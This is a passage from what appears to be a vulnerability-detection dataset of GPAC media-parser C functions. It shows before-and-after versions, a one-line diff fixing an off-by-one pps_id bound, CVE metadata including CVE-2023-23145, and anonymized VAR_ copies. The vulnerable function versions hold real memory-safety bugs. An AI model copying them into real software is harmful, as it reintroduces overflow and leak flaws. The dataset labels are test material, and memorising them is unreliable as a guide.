if ((VAR_2->pps->pic_order_present == 1) && !VAR_2->field_pic_flag)
VAR_2->delta_poc[1] = gf_bs_read_se_log(VAR_0, ""delta_poc1"");
}
if (VAR_2->pps->redundant_pic_cnt_present) {
VAR_2->redundant_pic_cnt = gf_bs_read_ue_log(VAR_0, ""redundant_pic_cnt"");
}
return 0;
}",gpac/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6/av_parsers.c/vul/before/1.json,"static s32 svc_parse_slice(GF_BitStream *bs, AVCState *avc, AVCSliceInfo *si)
{
	s32 pps_id;

	/*s->current_picture.reference= h->nal_ref_idc != 0;*/
	gf_bs_read_ue_log(bs, ""first_mb_in_slice"");
	si->slice_type = gf_bs_read_ue_log(bs, ""slice_type"");
	if (si->slice_type > 9) return -1;

	pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
	if ((pps_id<0) || (pps_id >= 255))
		return -1;
	si->pps = &avc->pps[pps_id];
	si->pps->id = pps_id;
	if (!si->pps->slice_group_count)
		return -2;
	si->sps = &avc->sps[si->pps->sps_id + GF_SVC_SSPS_ID_SHIFT];
	if (!si->sps->log2_max_frame_num)
		return -2;

	si->frame_num = gf_bs_read_int_log(bs, si->sps->log2_max_frame_num, ""frame_num"");

	si->field_pic_flag = 0;
	if (si->sps->frame_mbs_only_flag) {
		/*s->picture_structure= PICT_FRAME;*/
	}
	else {
		si->field_pic_flag = gf_bs_read_int_log(bs, 1, ""field_pic_flag"");
		if (si->field_pic_flag) si->bottom_field_flag = gf_bs_read_int_log(bs, 1, ""bottom_field_flag"");
	}
	if (si->nal_unit_type == GF_AVC_NALU_IDR_SLICE || si->svc_nalhdr.idr_pic_flag)
		si->idr_pic_id = gf_bs_read_ue_log(bs, ""idr_pic_id"");

	if (si->sps->poc_type == 0) {
		si->poc_lsb = gf_bs_read_int_log(bs, si->sps->log2_max_poc_lsb, ""poc_lsb"");
		if (si->pps->pic_order_present && !si->field_pic_flag) {
			si->delta_poc_bottom = gf_bs_read_se_log(bs, ""delta_poc_bottom"");
		}
	}
	else if ((si->sps->poc_type == 1) && !si->sps->delta_pic_order_always_zero_flag) {
		si->delta_poc[0] = gf_bs_read_se_log(bs, ""delta_poc0"");
		if ((si->pps->pic_order_present == 1) && !si->field_pic_flag)
			si->delta_poc[1] = gf_bs_read_se_log(bs, ""delta_poc1"");
	}
	if (si->pps->redundant_pic_cnt_present) {
		si->redundant_pic_cnt = gf_bs_read_ue_log(bs, ""redundant_pic_cnt"");
	}
	return 0;
}","static s32 svc_parse_slice(GF_BitStream *VAR_0, AVCState *VAR_1, AVCSliceInfo *VAR_2)
{
	s32 VAR_3;

	/* COMMENT_0 */
	gf_bs_read_ue_log(VAR_0, ""first_mb_in_slice"");
	VAR_2->slice_type = gf_bs_read_ue_log(VAR_0, ""slice_type"");
	if (VAR_2->slice_type > 9) return -1;

	VAR_3 = gf_bs_read_ue_log(VAR_0, ""pps_id"");
	if ((VAR_3<0) || (VAR_3 >= 255))
		return -1;
	VAR_2->pps = &VAR_1->pps[VAR_3];
	VAR_2->pps->id = VAR_3;
	if (!VAR_2->pps->slice_group_count)
		return -2;
	VAR_2->sps = &VAR_1->sps[VAR_2->pps->sps_id + VAR_4];
	if (!VAR_2->sps->log2_max_frame_num)
		return -2;

	VAR_2->frame_num = gf_bs_read_int_log(VAR_0, VAR_2->sps->log2_max_frame_num, ""frame_num"");

	VAR_2->field_pic_flag = 0;
	if (VAR_2->sps->frame_mbs_only_flag) {
		/* COMMENT_1 */
	}
	else {
		VAR_2->field_pic_flag = gf_bs_read_int_log(VAR_0, 1, ""field_pic_flag"");
		if (VAR_2->field_pic_flag) VAR_2->bottom_field_flag = gf_bs_read_int_log(VAR_0, 1, ""bottom_field_flag"");
	}
	if (VAR_2->nal_unit_type == VAR_5 || VAR_2->svc_nalhdr.idr_pic_flag)
		VAR_2->idr_pic_id = gf_bs_read_ue_log(VAR_0, ""idr_pic_id"");

	if (VAR_2->sps->poc_type == 0) {
		VAR_2->poc_lsb = gf_bs_read_int_log(VAR_0, VAR_2->sps->log2_max_poc_lsb, ""poc_lsb"");
		if (VAR_2->pps->pic_order_present && !VAR_2->field_pic_flag) {
			VAR_2->delta_poc_bottom = gf_bs_read_se_log(VAR_0, ""delta_poc_bottom"");
		}
	}
	else if ((VAR_2->sps->poc_type == 1) && !VAR_2->sps->delta_pic_order_always_zero_flag) {
		VAR_2->delta_poc[0] = gf_bs_read_se_log(VAR_0, ""delta_poc0"");
		if ((VAR_2->pps->pic_order_present == 1) && !VAR_2->field_pic_flag)
			VAR_2->delta_poc[1] = gf_bs_read_se_log(VAR_0, ""delta_poc1"");
	}
	if (VAR_2->pps->redundant_pic_cnt_present) {
		VAR_2->redundant_pic_cnt = gf_bs_read_ue_log(VAR_0, ""redundant_pic_cnt"");
	}
	return 0;
}",gpac/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6/av_parsers.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -8,7 +8,7 @@
 	if (si->slice_type > 9) return -1;
 
 	pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
-	if ((pps_id<0) || (pps_id > 255))
+	if ((pps_id<0) || (pps_id >= 255))
 		return -1;
 	si->pps = &avc->pps[pps_id];
 	si->pps->id = pps_id;","{'deleted_lines': ['\tif ((pps_id<0) || (pps_id > 255))'], 'added_lines': ['\tif ((pps_id<0) || (pps_id >= 255))']}",True,Buffer overflow vulnerability in function avc_parse_slice in file media_tools/av_parsers.c. GPAC version 2.3-DEV-rev1-g4669ba229-master.,7.8,HIGH,2,valid,2023-01-04T09:56:03Z,4
CVE-2023-23145,['CWE-401'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,fixed #2365,4ade98128cbc41d5115b97a41ca2e59529c8dd5f,https://github.com/gpac/gpac/commit/4ade98128cbc41d5115b97a41ca2e59529c8dd5f,src/laser/lsr_dec.c,lsr_read_rare_full,"static void lsr_read_rare_full(GF_LASeRCodec *lsr, GF_Node *n)
{
GF_FieldInfo info;
u32 i, nb_rare, field_rare;
s32 field_tag;
GF_LSR_READ_INT(lsr, nb_rare, 1, ""has_rare"");
if (!nb_rare) return;
GF_LSR_READ_INT(lsr, nb_rare, 6, ""nbOfAttributes"");
for (i=0; i<nb_rare; i++) {
GF_LSR_READ_INT(lsr, field_rare, 6, ""attributeRARE"");
if (field_rare==49) {
u32 extID, len, j;
while (1) {
GF_LSR_READ_INT(lsr, extID, lsr->info->cfg.extensionIDBits, ""extensionID"");
len = lsr_read_vluimsbf5(lsr, ""len"");
if (extID==2) {
GF_LSR_READ_INT(lsr, len, 2, ""nbOfAttributes"");
for (j=0; j<len; j++) {
GF_LSR_READ_INT(lsr, extID, 3, ""attributeRARE"");
switch (extID) {
case 0:
lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_syncMaster, GF_TRUE, GF_FALSE, &info);
GF_LSR_READ_INT(lsr, *(SVG_Boolean *)info.far_ptr, 1, ""syncMaster"");
break;
case 1:
lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_focusHighlight, GF_TRUE, GF_FALSE, &info);
GF_LSR_READ_INT(lsr, *(SVG_FocusHighlight *)info.far_ptr, 2, ""focusHighlight"");
break;
case 2:
lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_initialVisibility, GF_TRUE, GF_FALSE, &info);
GF_LSR_READ_INT(lsr, *(SVG_InitialVisibility *)info.far_ptr, 2, ""initialVisibility"");
break;
case 3:
lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_fullscreen, GF_TRUE, GF_FALSE, &info);
GF_LSR_READ_INT(lsr, *(SVG_Boolean *)info.far_ptr, 1, ""fullscreen"");
break;
case 4:
lsr->last_error = gf_node_get_attribute_by_tag(n, TAG_SVG_ATT_requiredFonts, GF_TRUE, GF_FALSE, &info);
lsr_read_byte_align_string_list(lsr, *(GF_List **)info.far_ptr, ""requiredFonts"", GF_FALSE, GF_TRUE);
break;
}
}
} else {
gf_bs_read_int(lsr->bs, len);
}
GF_LSR_READ_INT(lsr, extID, 1, ""hasNextExtension"");
if (!extID) break;
}
continue;
}
field_tag = gf_lsr_rare_type_to_attribute(field_rare);
if (field_tag==-1) {
return;
}
lsr->last_error = gf_node_get_attribute_by_tag(n, field_tag, GF_TRUE, GF_FALSE, &info);
if (!info.far_ptr) lsr->last_error = GF_NOT_SUPPORTED;
if (lsr->last_error) return;
switch (field_tag) {
case TAG_SVG_ATT__class:
lsr_read_byte_align_string(lsr, info.far_ptr, ""class"");
break;
case TAG_SVG_ATT_audio_level:
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""audio-level"");
break;
case TAG_SVG_ATT_color:
lsr_read_paint(lsr, (SVG_Paint *)info.far_ptr, ""color"");
break;
case TAG_SVG_ATT_color_rendering:
GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 2, ""color-rendering"");
break;
case TAG_SVG_ATT_display:
GF_LSR_READ_INT(lsr, *(SVG_Display*)info.far_ptr, 5, ""display"");
break;
case TAG_SVG_ATT_display_align:
GF_LSR_READ_INT(lsr, *(SVG_DisplayAlign*)info.far_ptr, 3, ""display-align"");
break;
case TAG_SVG_ATT_fill_opacity:
((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""fill-opacity"");
break;
case TAG_SVG_ATT_fill_rule:
GF_LSR_READ_INT(lsr, *(SVG_FillRule*)info.far_ptr, 2, ""fill-rule"");
break;
case TAG_SVG_ATT_image_rendering:
GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 2, ""image-rendering"");
break;
case TAG_SVG_ATT_line_increment:
lsr_read_line_increment_type(lsr, info.far_ptr, ""line-increment"");
break;
case TAG_SVG_ATT_pointer_events:
GF_LSR_READ_INT(lsr, *(SVG_PointerEvents*)info.far_ptr, 4, ""pointer-events"");
break;
case TAG_SVG_ATT_shape_rendering:
GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 3, ""shape-rendering"");
break;
case TAG_SVG_ATT_solid_color:
lsr_read_paint(lsr, info.far_ptr, ""solid-color"");
break;
case TAG_SVG_ATT_solid_opacity:
((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""solid-opacity"");
break;
case TAG_SVG_ATT_stop_color:
lsr_read_paint(lsr, info.far_ptr, ""stop-color"");
break;
case TAG_SVG_ATT_stop_opacity:
((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""stop-opacity"");
break;
case TAG_SVG_ATT_stroke_dasharray:
{
u32 j, flag;
SVG_StrokeDashArray *da = (SVG_StrokeDashArray *)info.far_ptr;
GF_LSR_READ_INT(lsr, flag, 1, ""dashArray"");
if (flag) {
da->type=SVG_STROKEDASHARRAY_INHERIT;
} else {
da->type=SVG_STROKEDASHARRAY_ARRAY;
da->array.count = lsr_read_vluimsbf5(lsr, ""len"");
da->array.vals = (Fixed*)gf_malloc(sizeof(Fixed)*da->array.count);
da->array.units = (u8*)gf_malloc(sizeof(u8)*da->array.count);
if (!da->array.vals || !da->array.units) {
lsr->last_error = GF_OUT_OF_MEM;
return;
}
for (j=0; j<da->array.count; j++) {
da->array.vals[j] = lsr_read_fixed_16_8(lsr, ""dash"");
da->array.units[j] = 0;
if (lsr->last_error) return;
}
}
}
break;
case TAG_SVG_ATT_stroke_dashoffset:
lsr_read_fixed_16_8i(lsr, info.far_ptr, ""dashOffset"");
break;
case TAG_SVG_ATT_stroke_linecap:
GF_LSR_READ_INT(lsr, *(SVG_StrokeLineCap*)info.far_ptr, 2, ""stroke-linecap"");
break;
case TAG_SVG_ATT_stroke_linejoin:
GF_LSR_READ_INT(lsr, *(SVG_StrokeLineJoin*)info.far_ptr, 2, ""stroke-linejoin"");
break;
case TAG_SVG_ATT_stroke_miterlimit:
lsr_read_fixed_16_8i(lsr, info.far_ptr, ""miterLimit"");
break;
case TAG_SVG_ATT_stroke_opacity:
((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""stroke-opacity"");
break;
case TAG_SVG_ATT_stroke_width:
lsr_read_fixed_16_8i(lsr, info.far_ptr, ""strokeWidth"");
break;
case TAG_SVG_ATT_text_anchor:
GF_LSR_READ_INT(lsr, *(SVG_TextAnchor*)info.far_ptr, 2, ""text-achor"");
break;
case TAG_SVG_ATT_text_rendering:
GF_LSR_READ_INT(lsr, *(SVG_RenderingHint*)info.far_ptr, 3, ""text-rendering"");
break;
case TAG_SVG_ATT_viewport_fill:
lsr_read_paint(lsr, info.far_ptr, ""viewport-fill"");
break;
case TAG_SVG_ATT_viewport_fill_opacity:
((SVG_Number*)info.far_ptr)->type = SVG_NUMBER_VALUE;
((SVG_Number*)info.far_ptr)->value = lsr_read_fixed_clamp(lsr, ""viewport-fill-opacity"");
break;
case TAG_SVG_ATT_vector_effect:
GF_LSR_READ_INT(lsr, *(SVG_VectorEffect*)info.far_ptr, 4, ""vector-effect"");
break;
case TAG_SVG_ATT_visibility:
GF_LSR_READ_INT(lsr, *(SVG_Visibility*)info.far_ptr, 2, ""visibility"");
break;
case TAG_SVG_ATT_requiredExtensions:
lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""requiredExtensions"", GF_TRUE, GF_FALSE);
break;
case TAG_SVG_ATT_requiredFormats:
lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""requiredFormats"", GF_FALSE, GF_FALSE);
break;
case TAG_SVG_ATT_requiredFeatures:
{
u32 j, fcount = lsr_read_vluimsbf5(lsr, ""count"");
for (j=0; j<fcount; j++) {
u32 fval;
GF_LSR_READ_INT(lsr, fval, 6, ""feature"");
if (lsr->last_error) return;
}
}
break;
case TAG_SVG_ATT_systemLanguage:
lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""systemLanguage"", GF_FALSE, GF_FALSE);
break;
case TAG_XML_ATT_base:
lsr_read_byte_align_string(lsr, &((XMLRI*)info.far_ptr)->string, ""xml:base"");
((XMLRI*)info.far_ptr)->type = XMLRI_STRING;
break;
case TAG_XML_ATT_lang:
lsr_read_byte_align_string(lsr, info.far_ptr, ""xml:lang"");
break;
case TAG_XML_ATT_space:
GF_LSR_READ_INT(lsr, *(XML_Space*)info.far_ptr, 1, ""xml:space"");
break;
case TAG_SVG_ATT_nav_next:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNext"");
break;
case TAG_SVG_ATT_nav_up:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorth"");
break;
case TAG_SVG_ATT_nav_up_left:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorthEast"");
break;
case TAG_SVG_ATT_nav_up_right:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusNorthWest"");
break;
case TAG_SVG_ATT_nav_prev:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusPrev"");
break;
case TAG_SVG_ATT_nav_down:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouth"");
break;
case TAG_SVG_ATT_nav_down_left:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouthEast"");
break;
case TAG_SVG_ATT_nav_down_right:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusSouthWest"");
break;
case TAG_SVG_ATT_nav_left:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusEast"");
break;
case TAG_SVG_ATT_focusable:
GF_LSR_READ_INT(lsr, *(SVG_Focusable*)info.far_ptr, 2, ""focusable"");
break;
case TAG_SVG_ATT_nav_right:
lsr_read_focus(lsr, (SVG_Focus*)info.far_ptr, ""focusWest"");
break;
case TAG_SVG_ATT_transform:
lsr_read_matrix(lsr, info.far_ptr);
break;
case TAG_SVG_ATT_text_decoration:
lsr_read_byte_align_string_list(lsr, *(GF_List**)info.far_ptr, ""textDecoration"", GF_FALSE, GF_FALSE);
break;
case TAG_SVG_ATT_font_variant:
GF_LSR_READ_INT(lsr, *(SVG_FontVariant*)info.far_ptr, 2, ""font-variant"");
break;
case TAG_SVG_ATT_font_family:
{
u32 flag;
GF_LSR_READ_INT(lsr, flag, 1, ""isInherit"");
if (flag) {
((SVG_FontFamily*)info.far_ptr)->type = SVG_FONTFAMILY_INHERIT;
} else {
char *ft;
((SVG_FontFamily*)info.far_ptr)->type = SVG_FONTFAMILY_VALUE;
GF_LSR_READ_INT(lsr, flag, lsr->fontIndexBits, ""fontIndex"");
ft = (char*)gf_list_get(lsr->font_table, flag);
if (ft) ((SVG_FontFamily*)info.far_ptr)->value = gf_strdup(ft);
}
}
break;
case TAG_SVG_ATT_font_size:
lsr_read_fixed_16_8i(lsr, info.far_ptr, ""fontSize"");
break;
case TAG_SVG_ATT_font_style:
GF_LSR_READ_INT(lsr, *(SVG_FontStyle*)info.far_ptr, 3, ""fontStyle"");
break;
case TAG_SVG_ATT_font_weight:
GF_LSR_READ_INT(lsr, *(SVG_FontWeight*)info.far_ptr, 4, ""fontWeight"");
break;
case TAG_XLINK_ATT_title:
lsr_read_byte_align_string(lsr, info.far_ptr, ""xlink:title"");
break;
case TAG_XLINK_ATT_type:
GF_LSR_READ_INT(lsr, field_rare, 3, ""xlink:type"");
break;
case TAG_XLINK_ATT_role:
lsr_read_any_uri(lsr, info.far_ptr, ""xlink:role"");
break;
case TAG_XLINK_ATT_arcrole:
lsr_read_any_uri(lsr, info.far_ptr, ""xlink:arcrole"");
break;
case TAG_XLINK_ATT_actuate:
GF_LSR_READ_INT(lsr, field_rare, 2, ""xlink:actuate"");
break;
case TAG_XLINK_ATT_show:
GF_LSR_READ_INT(lsr, field_rare, 3, ""xlink:show"");
break;
case TAG_SVG_ATT_end:
lsr_read_smil_times(lsr, NULL, 0, info.far_ptr, ""end"", 0);
break;
case TAG_SVG_ATT_max:
lsr_read_duration_ex(lsr, NULL, 0, info.far_ptr, ""min"", 0);
break;
case TAG_SVG_ATT_min:
lsr_read_duration_ex(lsr, NULL, 0, info.far_ptr, ""min"", 0);
break;
}
if (lsr->last_error) return;
}
}","static void lsr_read_rare_full(GF_LASeRCodec *VAR_0, GF_Node *VAR_1)
{
GF_FieldInfo VAR_2;
u32 VAR_3, VAR_4, VAR_5;
s32 VAR_6;
GF_LSR_READ_INT(VAR_0, VAR_4, 1, ""has_rare"");
if (!VAR_4) return;
GF_LSR_READ_INT(VAR_0, VAR_4, 6, ""nbOfAttributes"");
for (VAR_3=0; VAR_3<VAR_4; VAR_3++) {
GF_LSR_READ_INT(VAR_0, VAR_5, 6, ""attributeRARE"");
if (VAR_5==49) {
u32 VAR_7, VAR_8, VAR_9;
while (1) {
GF_LSR_READ_INT(VAR_0, VAR_7, VAR_0->info->cfg.extensionIDBits, ""extensionID"");
VAR_8 = lsr_read_vluimsbf5(VAR_0, ""len"");
if (VAR_7==2) {
GF_LSR_READ_INT(VAR_0, VAR_8, 2, ""nbOfAttributes"");
for (VAR_9=0; VAR_9<VAR_8; VAR_9++) {
GF_LSR_READ_INT(VAR_0, VAR_7, 3, ""attributeRARE"");
switch (VAR_7) {
case 0:
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_10, VAR_11, VAR_12, &VAR_2);
GF_LSR_READ_INT(VAR_0, *(SVG_Boolean *)VAR_2.far_ptr, 1, ""syncMaster"");
break;
case 1:
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_13, VAR_11, VAR_12, &VAR_2);
GF_LSR_READ_INT(VAR_0, *(SVG_FocusHighlight *)VAR_2.far_ptr, 2, ""focusHighlight"");
break;
case 2:
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_14, VAR_11, VAR_12, &VAR_2);
GF_LSR_READ_INT(VAR_0, *(SVG_InitialVisibility *)VAR_2.far_ptr, 2, ""initialVisibility"");
break;
case 3:
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_15, VAR_11, VAR_12, &VAR_2);
GF_LSR_READ_INT(VAR_0, *(SVG_Boolean *)VAR_2.far_ptr, 1, ""fullscreen"");
break;
case 4:
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_16, VAR_11, VAR_12, &VAR_2);
lsr_read_byte_align_string_list(VAR_0, *(GF_List **)VAR_2.far_ptr, ""requiredFonts"", VAR_12, VAR_11);
break;
}
}
} else {
gf_bs_read_int(VAR_0->bs, VAR_8);
}
GF_LSR_READ_INT(VAR_0, VAR_7, 1, ""hasNextExtension"");
if (!VAR_7) break;
}
continue;
}
VAR_6 = gf_lsr_rare_type_to_attribute(VAR_5);
if (VAR_6==-1) {
return;
}
VAR_0->last_error = gf_node_get_attribute_by_tag(VAR_1, VAR_6, VAR_11, VAR_12, &VAR_2);
if (!VAR_2.far_ptr) VAR_0->last_error = VAR_17;
if (VAR_0->last_error) return;
switch (VAR_6) {
case VAR_18:
lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""class"");
break;
case VAR_19:
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""audio-level"");
break;
case VAR_20:
lsr_read_paint(VAR_0, (SVG_Paint *)VAR_2.far_ptr, ""color"");
break;
case VAR_21:
GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 2, ""color-rendering"");
break;
case VAR_22:
GF_LSR_READ_INT(VAR_0, *(SVG_Display*)VAR_2.far_ptr, 5, ""display"");
break;
case VAR_23:
GF_LSR_READ_INT(VAR_0, *(SVG_DisplayAlign*)VAR_2.far_ptr, 3, ""display-align"");
break;
case VAR_24:
((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""fill-opacity"");
break;
case VAR_26:
GF_LSR_READ_INT(VAR_0, *(SVG_FillRule*)VAR_2.far_ptr, 2, ""fill-rule"");
break;
case VAR_27:
GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 2, ""image-rendering"");
break;
case VAR_28:
lsr_read_line_increment_type(VAR_0, VAR_2.far_ptr, ""line-increment"");
break;
case VAR_29:
GF_LSR_READ_INT(VAR_0, *(SVG_PointerEvents*)VAR_2.far_ptr, 4, ""pointer-events"");
break;
case VAR_30:
GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 3, ""shape-rendering"");
break;
case VAR_31:
lsr_read_paint(VAR_0, VAR_2.far_ptr, ""solid-color"");
break;
case VAR_32:
((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""solid-opacity"");
break;
case VAR_33:
lsr_read_paint(VAR_0, VAR_2.far_ptr, ""stop-color"");
break;
case VAR_34:
((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""stop-opacity"");
break;
case VAR_35:
{
u32 VAR_9, VAR_36;
SVG_StrokeDashArray *VAR_37 = (SVG_StrokeDashArray *)VAR_2.far_ptr;
GF_LSR_READ_INT(VAR_0, VAR_36, 1, ""dashArray"");
if (VAR_36) {
VAR_37->type=VAR_38;
} else {
VAR_37->type=VAR_39;
VAR_37->array.count = lsr_read_vluimsbf5(VAR_0, ""len"");
VAR_37->array.vals = (Fixed*)gf_malloc(sizeof(Fixed)*VAR_37->array.count);
VAR_37->array.units = (u8*)gf_malloc(sizeof(u8)*VAR_37->array.count);
if (!VAR_37->array.vals || !VAR_37->array.units) {
VAR_0->last_error = VAR_40;
return;
}
for (VAR_9=0; VAR_9<VAR_37->array.count; VAR_9++) {
VAR_37->array.vals[VAR_9] = lsr_read_fixed_16_8(VAR_0, ""dash"");
VAR_37->array.units[VAR_9] = 0;
if (VAR_0->last_error) return;
}
}
}
break;
case VAR_41:
lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""dashOffset"");
break;
case VAR_42:
GF_LSR_READ_INT(VAR_0, *(SVG_StrokeLineCap*)VAR_2.far_ptr, 2, ""stroke-linecap"");
break;
case VAR_43:
GF_LSR_READ_INT(VAR_0, *(SVG_StrokeLineJoin*)VAR_2.far_ptr, 2, ""stroke-linejoin"");
break;
case VAR_44:
lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""miterLimit"");
break;
case VAR_45:
((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""stroke-opacity"");
break;
case VAR_46:
lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""strokeWidth"");
break;
case VAR_47:
GF_LSR_READ_INT(VAR_0, *(SVG_TextAnchor*)VAR_2.far_ptr, 2, ""text-achor"");
break;
case VAR_48:
GF_LSR_READ_INT(VAR_0, *(SVG_RenderingHint*)VAR_2.far_ptr, 3, ""text-rendering"");
break;
case VAR_49:
lsr_read_paint(VAR_0, VAR_2.far_ptr, ""viewport-fill"");
break;
case VAR_50:
((SVG_Number*)VAR_2.far_ptr)->type = VAR_25;
((SVG_Number*)VAR_2.far_ptr)->value = lsr_read_fixed_clamp(VAR_0, ""viewport-fill-opacity"");
break;
case VAR_51:
GF_LSR_READ_INT(VAR_0, *(SVG_VectorEffect*)VAR_2.far_ptr, 4, ""vector-effect"");
break;
case VAR_52:
GF_LSR_READ_INT(VAR_0, *(SVG_Visibility*)VAR_2.far_ptr, 2, ""visibility"");
break;
case VAR_53:
lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""requiredExtensions"", VAR_11, VAR_12);
break;
case VAR_54:
lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""requiredFormats"", VAR_12, VAR_12);
break;
case VAR_55:
{
u32 VAR_9, VAR_56 = lsr_read_vluimsbf5(VAR_0, ""count"");
for (VAR_9=0; VAR_9<VAR_56; VAR_9++) {
u32 VAR_57;
GF_LSR_READ_INT(VAR_0, VAR_57, 6, ""feature"");
if (VAR_0->last_error) return;
}
}
break;
case VAR_58:
lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""systemLanguage"", VAR_12, VAR_12);
break;
case VAR_59:
lsr_read_byte_align_string(VAR_0, &((XMLRI*)VAR_2.far_ptr)->string, ""xml:base"");
((XMLRI*)VAR_2.far_ptr)->type = VAR_60;
break;
case VAR_61:
lsr_read_byte_align_string(VAR_0, VAR_2.far_ptr, ""xml:lang"");
break;
case VAR_62:
GF_LSR_READ_INT(VAR_0, *(XML_Space*)VAR_2.far_ptr, 1, ""xml:space"");
break;
case VAR_63:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNext"");
break;
case VAR_64:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorth"");
break;
case VAR_65:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorthEast"");
break;
case VAR_66:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusNorthWest"");
break;
case VAR_67:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusPrev"");
break;
case VAR_68:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouth"");
break;
case VAR_69:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouthEast"");
break;
case VAR_70:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusSouthWest"");
break;
case VAR_71:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusEast"");
break;
case VAR_72:
GF_LSR_READ_INT(VAR_0, *(SVG_Focusable*)VAR_2.far_ptr, 2, ""focusable"");
break;
case VAR_73:
lsr_read_focus(VAR_0, (SVG_Focus*)VAR_2.far_ptr, ""focusWest"");
break;
case VAR_74:
lsr_read_matrix(VAR_0, VAR_2.far_ptr);
break;
case VAR_75:
lsr_read_byte_align_string_list(VAR_0, *(GF_List**)VAR_2.far_ptr, ""textDecoration"", VAR_12, VAR_12);
break;
case VAR_76:
GF_LSR_READ_INT(VAR_0, *(SVG_FontVariant*)VAR_2.far_ptr, 2, ""font-variant"");
break;
case VAR_77:
{
u32 VAR_36;
GF_LSR_READ_INT(VAR_0, VAR_36, 1, ""isInherit"");
if (VAR_36) {
((SVG_FontFamily*)VAR_2.far_ptr)->type = VAR_78;
} else {
char *VAR_79;
((SVG_FontFamily*)VAR_2.far_ptr)->type = VAR_80;
GF_LSR_READ_INT(VAR_0, VAR_36, VAR_0->fontIndexBits, ""fontIndex"");
VAR_79 = (char*)gf_list_get(VAR_0->font_table, VAR_36);
if (VAR_79) ((SVG_FontFamily*)VAR_2.far_ptr)->value = gf_strdup(VAR_79);
}
}
break;
case VAR_81:
lsr_read_fixed_16_8i(VAR_0, VAR_2.far_ptr, ""fontSize"");
break;
case VAR_82:
GF_LSR_READ_INT(VAR_0, *(SVG_FontStyle*)VAR_2.far_ptr, 3, ""fontStyle"");
break;
case VAR_83:
GF_LSR_READ_INT(VAR_0, *(SVG_FontWeight*)VAR_2.far_ptr, 4, ""fontWeight"");
break;
case VAR_84:
